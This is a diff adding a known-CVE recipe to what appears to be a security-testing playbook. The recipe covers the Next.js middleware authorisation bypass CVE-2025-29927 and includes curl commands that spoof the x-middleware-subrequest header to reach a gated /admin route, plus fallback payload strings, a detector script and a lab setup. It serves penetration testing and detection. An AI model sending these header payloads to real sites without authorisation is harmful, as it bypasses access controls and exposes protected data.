@@ -95,6 +95,29 @@ nuclei -u "<url>" -severity low,medium,high,critical -rl 20 -o artifacts/nuclei.
 testssl.sh --quiet --jsonfile artifacts/testssl.json "<host>:443"
 ```
 
+## Known-CVE recipes
+
+### CVE-2025-29927 — Next.js middleware auth bypass (Critical, self-hosted only)
+
+Fingerprint Next.js first (`x-powered-by: Next.js`, `/_next/static/...`,
+`__NEXT_DATA__`). If middleware gates a route, confirm the bypass with a
+two-request behavioral diff (send `x-middleware-subrequest`; a redirect/401/403
+turning into 200 = middleware skipped). Detection and exploitation are the same
+primitive — one header, no auth. Version-dependent payload (widest first):
+
+```bash
+# clean vs spoofed on a middleware-gated route
+curl -s -o /dev/null -w '%{http_code}\n' --max-redirs 0 "<url>/admin"   # e.g. 307/401
+curl -s -w '%{http_code}\n' --max-redirs 0 \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
+  "<url>/admin"                                                          # 200 => VULNERABLE
+# payload fallbacks: "src/middleware:..:x5", "middleware", "src/middleware", "pages/_middleware"
+```
+Ready-made detector + demo lab: `target/nextjs-cve-lab/detect.sh <base-url> [path] [marker]`
+(exit 0 VULNERABLE / 1 patched); boot the lab with `sandbox-setup/nextjs-cve.sh`.
+Patched at 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5. Vercel-hosted is not exploitable
+(edge strips the header). Works via `http_probe` for black-box targets.
+
 ## Usage rules
 
 - One payload class per probe batch; log every request to artifacts.
